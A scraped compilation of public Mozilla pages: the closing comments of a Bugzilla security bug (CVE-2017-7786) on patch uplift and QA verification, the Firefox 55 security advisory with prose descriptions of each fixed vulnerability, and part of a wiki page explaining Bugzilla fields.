Flags: approval-mozilla-esr52?
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: approval-mozilla-beta?

|  | [Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)](/user_profile?user_id=538805) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1365189#c33)• 8 years ago |
|  | |

Comment on [attachment 8879650](/attachment.cgi?id=8879650 "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[details]](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[diff]](/attachment.cgi?id=8879650&action=diff "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650)
part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]
Sec-high, Beta55+, ESR52.3+
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: approval-mozilla-esr52?
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: approval-mozilla-esr52+
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: approval-mozilla-beta?
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1365189#c34)• 8 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/c1683cb4df45>
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a3683359_280903)• 8 years ago |

Whiteboard: [adv-main55+]

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1365189#c35)• 8 years ago |
|  | |

For ESR, should I land this just on tip, or also on FIREFOX\_ESR\_52\_0\_X\_RELBRANCH?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1365189#c36)• 8 years ago |
|  | |

You want to land on the default branch. Avoid anything marked as a RELBRANCH since those are only for out-of-band dot releases. That said, the ESR52 patch needs rebasing it appears :)Flags: needinfo?(jwatt)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1365189#c37)• 8 years ago |
| uplift | |

Jonathan rebased and landed this on ESR52.
<https://hg.mozilla.org/releases/mozilla-esr52/rev/5c26df489768>
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed)Flags: needinfo?(jwatt)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a3770726_280903)• 8 years ago |

Whiteboard: [adv-main55+] → [adv-main55+][adv-esr52.3+]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a3927408_280903)• 8 years ago |

Alias: CVE-2017-7786

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a4366848_1689)• 8 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a4787235_1689)• 8 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a6631972_452604)• 7 years ago |

Flags: qe-verify+Whiteboard: [adv-main55+][adv-esr52.3+] → [adv-main55+][adv-esr52.3+][post-critsmash-triage]

|  | [Andrei Vaida [:avaida]](/user_profile?user_id=488993) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1365189#c38)• 7 years ago |
|  | |

I was able to reproduce the crash on an affected asan build (55.0a1, 20170516101906) using the test case from [Comment 4](/show_bug.cgi?id=1365189#c4 "VERIFIED FIXED - type confusion in mozilla::SVGGeometryFrame::GetCanvasTM") on Ubuntu 16.04 x64.
The crash is no longer occurring on Ubuntu 16.04 x64 using the following builds:
- asan 56.0a1 (20170801004347)
- asan 55.0b14 (20170731114018)
- asan 52.2.1esr (20170731121041)Status: RESOLVED → VERIFIED
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified)
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=verified)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=verified)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a22613230_1689)• 7 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a222167721_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1365189&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Nils](/user_profile?user_id=344130)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_130dd732_20250125_200848.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2017-18

## Security vulnerabilities fixed in Firefox 55

Announced
August 8, 2017
Impact
critical
Products
Firefox
Fixed in

* Firefox 55

#### [#CVE-2017-7798: XUL injection in the style editor in devtools](#CVE-2017-7798)

Reporter
Frederik Braun
Impact
critical
##### Description

The Developer Tools feature suffers from a XUL injection vulnerability due to improper sanitization of the web page source code. In the worst case, this could allow arbitrary code execution when opening a malicious page with the style editor tool.

##### References

* [Bug 1371586, 1372112](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1371586%2C1372112)

#### [#CVE-2017-7800: Use-after-free in WebSockets during disconnection](#CVE-2017-7800)

Reporter
Looben Yang
Impact
critical
##### Description

A use-after-free vulnerability can occur in WebSockets when the object holding the connection is freed before the disconnection operation is finished. This results in an exploitable crash.

##### References

* [Bug 1374047](https://bugzilla.mozilla.org/show_bug.cgi?id=1374047)

#### [#CVE-2017-7801: Use-after-free with marquee during window resizing](#CVE-2017-7801)

Reporter
Nils
Impact
critical
##### Description

A use-after-free vulnerability can occur while re-computing layout for a `marquee` element during window resizing where the updated style object is freed while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1371259](https://bugzilla.mozilla.org/show_bug.cgi?id=1371259)

#### [#CVE-2017-7809: Use-after-free while deleting attached editor DOM node](#CVE-2017-7809)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when an editor DOM node is deleted prematurely during tree traversal while still bound to the document. This results in a potentially exploitable crash.

##### References

* [Bug 1380284](https://bugzilla.mozilla.org/show_bug.cgi?id=1380284)

#### [#CVE-2017-7784: Use-after-free with image observers](#CVE-2017-7784)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when reading an image observer during frame reconstruction after the observer has been freed. This results in a potentially exploitable crash.

##### References

* [Bug 1376087](https://bugzilla.mozilla.org/show_bug.cgi?id=1376087)

#### [#CVE-2017-7802: Use-after-free resizing image elements](#CVE-2017-7802)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when manipulating the DOM during the resize event of an image element. If these elements have been freed due to a lack of strong references, a potentially exploitable crash may occur when the freed elements are accessed.

##### References

* [Bug 1378147](https://bugzilla.mozilla.org/show_bug.cgi?id=1378147)

#### [#CVE-2017-7785: Buffer overflow manipulating ARIA attributes in DOM](#CVE-2017-7785)

Reporter
Nils
Impact
high
##### Description

A buffer overflow can occur when manipulating Accessible Rich Internet Applications (ARIA) attributes within the DOM. This results in a potentially exploitable crash.

##### References

* [Bug 1356985](https://bugzilla.mozilla.org/show_bug.cgi?id=1356985)

#### [#CVE-2017-7786: Buffer overflow while painting non-displayable SVG](#CVE-2017-7786)

Reporter
Nils
Impact
high
##### Description

A buffer overflow can occur when the image renderer attempts to paint non-displayable SVG elements. This results in a potentially exploitable crash.

##### References

* [Bug 1365189](https://bugzilla.mozilla.org/show_bug.cgi?id=1365189)

#### [#CVE-2017-7806: Use-after-free in layer manager with SVG](#CVE-2017-7806)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when the layer manager is freed too early when rendering specific SVG content, resulting in a potentially exploitable crash.

##### References

* [Bug 1378113](https://bugzilla.mozilla.org/show_bug.cgi?id=1378113)

#### [#CVE-2017-7753: Out-of-bounds read with cached style data and pseudo-elements](#CVE-2017-7753)

Reporter
SkyLined
Impact
high
##### Description

An out-of-bounds read occurs when applying style rules to pseudo-elements, such as ::first-line, using cached style data.

##### References

* [Bug 1353312](https://bugzilla.mozilla.org/show_bug.cgi?id=1353312)

#### [#CVE-2017-7787: Same-origin policy bypass with iframes through page reloads](#CVE-2017-7787)

Reporter
Oliver Wagner
Impact
high
##### Description

Same-origin policy protections can be bypassed on pages with embedded iframes during page reloads, allowing the iframes to access content on the top level page, leading to information disclosure.

##### References

* [Bug 1322896](https://bugzilla.mozilla.org/show_bug.cgi?id=1322896)

#### [#CVE-2017-7807: Domain hijacking through AppCache fallback](#CVE-2017-7807)

Reporter
Mathias Karlsson
Impact
high
##### Description

A mechanism that uses AppCache to hijack a URL in a domain using fallback by serving the files from a sub-path on the domain. This has been addressed by requiring fallback files be inside the manifest directory.

##### References

* [Bug 1376459](https://bugzilla.mozilla.org/show_bug.cgi?id=1376459)

#### [#CVE-2017-7792: Buffer overflow viewing certificates with an extremely long OID](#CVE-2017-7792)

Reporter
Fraser Tweedale
Impact
high
##### Description

A buffer overflow will occur when viewing a certificate in the certificate manager if the certificate has an extremely long object identifier (OID). This results in a potentially exploitable crash.

##### References

* [Bug 1368652](https://bugzilla.mozilla.org/show_bug.cgi?id=1368652)

#### [#CVE-2017-7804: Memory protection bypass through WindowsDllDetourPatcher](#CVE-2017-7804)

Reporter
Stephen Fewer
Impact
high
##### Description

The destructor function for the `WindowsDllDetourPatcher` class can be re-purposed by malicious code in concert with another vulnerability to write arbitrary data to an attacker controlled location in memory. This can be used to bypass existing memory protections in this situation.
*Note: This attack only affects Windows operating systems. Other operating systems are not affected.*

##### References

* [Bug 1372849](https://bugzilla.mozilla.org/show_bug.cgi?id=1372849)

#### [#CVE-2017-7791: Spoofing following page navigation with data: protocol and modal alerts](#CVE-2017-7791)

Reporter
Jose María Acuña
Impact
moderate
##### Description

On pages containing an iframe, the `data:` protocol can be used to create a modal alert that will render over arbitrary domains following page navigation, spoofing of the origin of the modal alert from the iframe content.

##### References

* [Bug 1365875](https://bugzilla.mozilla.org/show_bug.cgi?id=1365875)

#### [#CVE-2017-7808: CSP information leak with frame-ancestors containing paths](#CVE-2017-7808)

Reporter
Jun Kokatsu
Impact
moderate
##### Description

A content security policy (CSP) `frame-ancestors` directive containing origins with paths allows for comparisons against those paths instead of the origin. This results in a cross-origin information leak of this path information.

##### References

* [Bug 1367531](https://bugzilla.mozilla.org/show_bug.cgi?id=1367531)

#### [#CVE-2017-7782: WindowsDllDetourPatcher allocates memory without DEP protections](#CVE-2017-7782)

Reporter
Arthur Edelstein
Impact
moderate
##### Description

An error in the `WindowsDllDetourPatcher` where a RWX ("Read/Write/Execute") 4k block is allocated but never protected, violating DEP protections.
*Note: This attack only affects Windows operating systems. Other operating systems are not affected.*

##### References

* [Bug 1344034](https://bugzilla.mozilla.org/show_bug.cgi?id=1344034)

#### [#CVE-2017-7781: Elliptic curve point addition error when using mixed Jacobian-affine coordinates](#CVE-2017-7781)

Reporter
Antonio Sanso
Impact
moderate
##### Description

An error occurs in the elliptic curve point addition algorithm that uses mixed Jacobian-affine coordinates where it can yield a result `POINT_AT_INFINITY` when it should not. A man-in-the-middle attacker could use this to interfere with a connection, resulting in an attacked party computing an incorrect shared secret.

##### References

* [Bug 1352039](https://bugzilla.mozilla.org/show_bug.cgi?id=1352039)

#### [#CVE-2017-7794: Linux file truncation via sandbox broker](#CVE-2017-7794)

Reporter
Jann Horn
Impact
moderate
##### Description

On Linux systems, if the content process is compromised, the sandbox broker will allow files to be truncated even though the sandbox explicitly only has read access to the local file system and no write permissions.
*Note: This attack only affects the Linux operating system. Other operating systems are not affected.*

##### References

* [Bug 1374281](https://bugzilla.mozilla.org/show_bug.cgi?id=1374281)

#### [#CVE-2017-7803: CSP containing 'sandbox' improperly applied](#CVE-2017-7803)

Reporter
Rhys Enniks
Impact
moderate
##### Description

When a page’s content security policy (CSP) header contains a `sandbox` directive, other directives are ignored. This results in the incorrect enforcement of CSP.

##### References

* [Bug 1377426](https://bugzilla.mozilla.org/show_bug.cgi?id=1377426)

#### [#CVE-2017-7799: Self-XSS XUL injection in about:webrtc](#CVE-2017-7799)

Reporter
Frederik Braun
Impact
moderate
##### Description

JavaScript in the `about:webrtc` page is not sanitized properly being assigned to `innerHTML`. Data on this page is supplied by WebRTC usage and is not under third-party control, making this difficult to exploit, but the vulnerability could possibly be used for a cross-site scripting (XSS) attack.

##### References

* [Bug 1372509](https://bugzilla.mozilla.org/show_bug.cgi?id=1372509)

#### [#CVE-2017-7783: DOS attack through long username in URL](#CVE-2017-7783)

Reporter
Amit Sangra
Impact
low
##### Description

If a long user name is used in a username/password combination in a site URL (such as  `http://UserName:Password@example.com`), the resulting modal prompt will hang in a non-responsive state or crash, causing a denial of service.

##### References

* [Bug 1360842](https://bugzilla.mozilla.org/show_bug.cgi?id=1360842)

#### [#CVE-2017-7788: Sandboxed about:srcdoc iframes do not inherit CSP directives](#CVE-2017-7788)

Reporter
Muneaki Nishimura
Impact
low
##### Description

When an `iframe` has a `sandbox` attribute and its content is specified using `srcdoc`, that content does not inherit the containing page's Content Security Policy (CSP) as it should unless the sandbox attribute included `allow-same-origin`.

##### References

* [Bug 1073952](https://bugzilla.mozilla.org/show_bug.cgi?id=1073952)

#### [#CVE-2017-7789: Failure to enable HSTS when two STS headers are sent for a connection](#CVE-2017-7789)

Reporter
Muneaki Nishimura
Impact
low
##### Description

If a server sends two Strict-Transport-Security (STS) headers for a single connection, they will be rejected as invalid and HTTP Strict Transport Security (HSTS) will not be enabled for the connection.

##### References

* [Bug 1074642](https://bugzilla.mozilla.org/show_bug.cgi?id=1074642)

#### [#CVE-2017-7790: Windows crash reporter reads extra memory for some non-null-terminated registry values](#CVE-2017-7790)

Reporter
Xiaoyin Liu
Impact
low
##### Description

On Windows systems, if non-null-terminated strings are copied into the crash reporter for some specific registry keys, stack memory data can be copied until a null is found. This can potentially contain private data from the local system.
*Note: This attack only affects Windows operating systems. Other operating systems are not affected.*

##### References

* [Bug 1350460](https://bugzilla.mozilla.org/show_bug.cgi?id=1350460)

#### [#CVE-2017-7796: Windows updater can delete any file named update.log](#CVE-2017-7796)

Reporter
Matt Howell
Impact
low
##### Description

On Windows systems, the logger run by the Windows updater deletes the file "update.log" before it runs in order to write a new log of that name. The path to this file is supplied at the command line to the updater and could be used in concert with another local exploit to delete a different file named "update.log" instead of the one intended.
*Note: This attack only affects Windows operating systems. Other operating systems are not affected.*

##### References

* [Bug 1234401](https://bugzilla.mozilla.org/show_bug.cgi?id=1234401)

#### [#CVE-2017-7797: Response header name interning leaks across origins](#CVE-2017-7797)

Reporter
Anne van Kesteren
Impact
low
##### Description

Response header name interning does not have same-origin protections and these headers are stored in a global registry. This allows stored header names to be available cross-origin.

##### References

* [Bug 1334776](https://bugzilla.mozilla.org/show_bug.cgi?id=1334776)

#### [#CVE-2017-7780: Memory safety bugs fixed in Firefox 55](#CVE-2017-7780)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Gary Kwong, Christian Holler, André Bargull, Bob Clary, Carsten Book, Emilio Cobos Álvarez, Masayuki Nakano, Sebastian Hengst, Franziskus Kiefer, Tyson Smith, and Ronald Crane reported memory safety bugs present in Firefox 54. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 55](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1353763%2C1353356%2C1370070%2C1375435%2C1373663%2C1363150%2C1370817%2C1273678%2C1367850%2C1347968%2C1361749%2C1349138%2C1371982%2C1344666%2C1369836%2C1330739%2C1371511%2C1371484)

#### [#CVE-2017-7779: Memory safety bugs fixed in Firefox 55 and Firefox ESR 52.3](#CVE-2017-7779)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Masayuki Nakano, Gary Kwong, Ronald Crane, Andrew McCreight, Tyson Smith, Bevis Tseng, Christian Holler, Bryce Van Dyk, Dragana Damjanovic, Kartikaya Gupta, Philipp, Tristan Bourvon, and Andi-Bogdan Postelnicu reported memory safety bugs present in Firefox 54 and Firefox ESR 52.2. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 55 and Firefox ESR 52.3](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1354443%2C1368576%2C1366903%2C1369913%2C1371424%2C1346590%2C1371890%2C1372985%2C1362924%2C1368105%2C1369994%2C1371283%2C1368362%2C1378826%2C1380426%2C1368030%2C1373220%2C1321384%2C1383002)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_73f8d6fa_20250126_113746.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
